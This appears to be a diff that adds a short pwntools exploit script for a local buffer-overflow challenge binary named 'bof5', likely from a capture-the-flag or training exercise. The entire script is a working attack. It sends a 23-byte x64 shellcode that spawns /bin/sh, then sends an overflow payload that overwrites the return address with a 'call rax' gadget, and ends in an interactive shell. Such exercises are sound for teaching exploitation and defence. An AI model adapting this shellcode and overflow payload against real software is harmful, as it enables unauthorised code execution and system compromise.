@@ -1,0 +1,12 @@
+from pwn import *
+
+p = process("./bof5")
+
+call_rax = 0x0000000000401014
+
+payload = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05' #shellcode x64 23 bytes
+p.sendafter(b"> ", payload)
+payload = b'A' * 0x210 + b'B' * 0x8 + p64(call_rax)
+p.sendafter(b"> ", payload)
+
+p.interactive()
